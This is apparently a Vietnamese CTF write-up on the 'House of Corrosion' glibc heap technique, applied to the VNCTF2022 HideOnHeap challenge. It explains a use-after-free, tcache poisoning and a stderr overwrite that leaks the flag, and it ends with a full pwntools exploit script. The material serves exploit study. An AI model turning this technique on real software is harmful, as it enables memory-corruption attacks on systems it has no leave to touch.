---
title: House of Corrosion
date: 2024-04-26 17-30-56
categories: [CTF]
tags: [pwn, heap, research]
math: true
---

# Giới thiệu

- Ý tưởng của `House of Corrosion` là tận dụng việc ta có thể ghi đè `global_max_fast` gây OOB trong mảng `main_arena.fastbinY`. Bug này từ 2.23 - 2.29

# Ý tưởng

- Đầu tiên ta sẽ xem struct của `main_arena`
  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-04-26-17-38-36.png)
- Ta chú ý thấy có một mảng `fastbinY` có chức năng lưu con trỏ ở đầu linked-list của fastbin từ 0x20 đến 0x80
  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-04-26-17-43-00.png)
- Ngoài ra, `global_max_fast` là biến toàn cục là giới hạn của `fastbinY`
  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-04-26-17-46-10.png)
- Giả sử nếu ta có thể overwrite `global_max_fast` với giá trị lớn hơn nhằm mục đính có thể overwrite các `IO` để leak hoặc get shell thì chúng ta có công thức sau.

```
chunk size = (delta * 2) + 0x20
```

- delta là delta = địa chỉ target - địa chỉ của phần tử đầu tiên của `fastbinY` (`fastbinY[0]`)
- Ví dụ tôi cần overwrite flags của `_IO_2_1_stderr` bằng 1 địa chỉ heap
  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-04-26-17-55-49.png)

# VNCTF2022_HideOnHeap

## Phân tích

- Đầu tiên, `flag` được ghi vào chunk đầu tiên của heap

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-27-43.png)

- Điều khiến cho chall khó ở chỗ không có option để leak heap hay libc.

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-29-03.png)

- Ở option `delete` có bug UAF cho phép ta có thể DBF

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-31-59.png)

- Ở option `edit` có vẻ như an toàn khi kiểm tra size (khi `delete` size bị gán 0). Tuy nhiên, việc `delete` không xoá con trỏ sau khi `free` khiến ta có thể tạo 2 con trỏ (1 con trỏ để free, 1 con trỏ để write-after-free).

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-32-42.png)

- Tuy nhiên chúng ta có flag ở chunk trong heap

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-36-59.png)

- Như đã phân tích ở trên, mặc dù `flag` đã được load vào heap nhưng không có cách nào để in ra. Khi này chúng ta có thể sử dụng FSOP, để in flag.
- Trong `_malloc_assert` có `__fxprintf` có tham số đầu tiên là `NULL` sẽ sử dụng `stderr`. Do vậy ta sẽ overwrite `stderr` để in ra flag.

![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-44-36.png)

## Khai thác

### Chuẩn bị

```python
add(0x14b0)  # 0 chunk này chuẩn bị cho stderr
# padding
for i in range(7):
    add(0x50)  # 1-7
for i in range(7):
    add(0x60)  # 8-14
# các chunk này tôi sử dụng để copy addr cho UAF
add(0x90)  # 15
add(0x90)  # 16
add(0x90)  # 17

# làm đầy tcache
for i in range(1, 8):
    delete(i)

for i in range(8, 15):
    delete(i)
# có 2 idx cùng trỏ về 1 chunk => UAF
delete(15)  # 15 = 1
add(0x90)
delete(16)  # 16 = 2
add(0x90)
```

### Write-after-free tìm global_max_fast

- Ta cần brute force 1/16 để tìm được địa chỉ của `global_max_fast`

```python
for i in range(7):
    delete(15)
    edit(1, b'a'*0x10)
delete(15)
add(0x10)
edit(1, p16(0xab80))
add(0x90)
add(0x90)  # 5 #global_max_fast
add(0x70)  # clean unsorted bin
```

### tcache _IO_2_1_stderr_

```python
for i in range(2):
    delete(16)
    edit(2, b'a'*0x10)
delete(16)
add(0x10)
edit(2, p16(0x85c0))
add(0x90)
add(0x90)   # 9
add(0x70)   # clean unsorted bin
```

### overwrite top chunk

- Mục đích là ta sẽ malloc 1 chunk lớn hơn top chunk để chương trình báo lỗi và call `_malloc_assert`

  ![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-16-08-00.png)

```python
add(0x14c0) # 11 prepare for ow stderr
add(0x14d0) # 12 prepare for ow stderr

add(0x10)   # 13
add(0x10)   # 14
add(0x420)  # 15
delete(13)
delete(14)
delete(15)
add(0x420)  # 13 = 15
delete(15)
add(0x410)  # 14


add(0x10)
edit(13, b'\x00'*0x410 + flat(0, 0x231))
```

### overwrite stderr

![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-16-12-57.png)

```python
edit(5, b'aaaa')
delete(11)
delete(12)
delete(0)
edit(9, flat(0xfbad1800, 0,0,0) + b'\0')
edit(5, p32(0x80))
# get flag
add(0x666)
```

## Tham khảo

https://blog.csdn.net/yongbaoii/article/details/123199465
https://sh0ve1.github.io/2022/03/26/VNCTF2022-PWN-WriteUp/
https://www.cnblogs.com/winmt/articles/15887841.html
https://www.cnblogs.com/LynneHuan/p/15890280.html#hideonheap

### Kết quả

![](/assets/2024-04-26-House%20of%20Corrosion/2024-05-24-15-50-03.png)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('HideOnHeap_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()


def add(sz):
    sla(b':', '1')
    sla(b':', str(sz))


def delete(idx):
    sla(b':', '3')
    sla(b':', str(idx))


def edit(idx, pa):
    sla(b':', '2')
    sla(b':', str(idx))
    sa(b':', (pa))


add(0x14b0)  # 0

for i in range(7):
    add(0x50)  # 1-7
for i in range(7):
    add(0x60)  # 8-14

add(0x90)  # 15
add(0x90)  # 16
add(0x90)  # 17


for i in range(1, 8):
    delete(i)

for i in range(8, 15):
    delete(i)

delete(15)  # 15 = 1
add(0x90)
delete(16)  # 16 = 2
add(0x90)

# delete(19)
# add(0x420) # 3 = 19
# delete(19)
# add(0x410) # 4

# edit(3 , b'\x00'*0x410 + p64(0) + p64(0x233))

for i in range(7):
    delete(15)
    edit(1, b'a'*0x10)
delete(15)
add(0x10)
edit(1, p16(0xab80))
add(0x90)
add(0x90)  # 5 #global_max_fast
add(0x70)  # clean unsorted bin

# delete(17)
for i in range(2):
    delete(16)
    edit(2, b'a'*0x10)
delete(16)
add(0x10)
edit(2, p16(0x85c0))
add(0x90)
add(0x90)   # 9
add(0x70)   # clean unsorted bin

add(0x14c0) # 11
add(0x14d0) # 12

add(0x10)   # 13
add(0x10)   # 14
add(0x420)  # 15
delete(13)
delete(14)
delete(15)
add(0x420)  # 13 = 15
delete(15)
add(0x410)  # 14


add(0x10)
edit(13, b'\x00'*0x410 + flat(0, 0x231))


edit(5, b'aaaa')
delete(11)
delete(12)
delete(0)
edit(9, flat(0xfbad1800, 0,0,0) + b'\0')
edit(5, p32(0x80))

add(0x666)
p.interactive()
'''
p &_IO_2_1_stderr_
0x14c0
tel 0x555555558040
'''
```
